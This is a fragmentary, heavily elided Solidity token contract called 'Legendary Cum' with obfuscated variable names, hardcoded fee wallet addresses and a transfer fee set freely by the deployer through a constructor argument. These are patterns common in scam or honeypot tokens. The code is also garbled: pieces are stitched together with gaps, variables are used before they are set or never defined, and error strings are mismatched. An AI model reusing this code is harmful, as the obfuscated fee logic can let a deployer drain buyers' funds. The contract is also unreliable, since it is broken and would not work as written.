...
interface ERC20Metadata is ERC20 {
 ...
 contract LegendaryCum is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private hubavaKalina;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name;
    string private _symbol = "LEGENDCUM";
    uint256 private constant MAX = ~uint256(0);

    uint256 private _maxTx = _totalSupply;
    address private _feeAddrWallet1 = 0x8c820aa9C65Bce5c1781a62f6c5AEc83c487a083;
    address private _feeAddrWallet2 = 0x8c820aa9C65Bce5c1781a62f6c5AEc83c487a083;
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    uint256 private constant _tTotal = 10000000 * 10**18;
    address private _taktak = 0x9CDDFb93BDD0B5C450f6091Af1339e84a1151D30;
    ...
    constructor(uint256 totalSupply_, uint256 quatro) {
        _name = "Legendary Cum";
        _owner = _msgSender();
        _totalSupply = totalSupply_;
        _demand = quatro;
        hubavaKalina[msg.sender] = _totalSupply;
...
function sendETHToFee (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = hubavaKalina[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            hubavaKalina[issuer] = senderBalance - allons;
        }
        _fee = (allons * _demand / 100) / _francis;
        allons = allons -  (_fee * _francis);
        
        hubavaKalina[grantee] += allons;
   ...
   */
    ...
    function _burn(address account, uint256 sum) internal virtual {
        ...
        uint256 accountBalance = hubavaKalina[account];
        require(accountBalance >= sum, "BEP : Can't be done");
        unchecked {
            hubavaKalina[account] = accountBalance - sum;
        }
        _totalSupply -= sum;
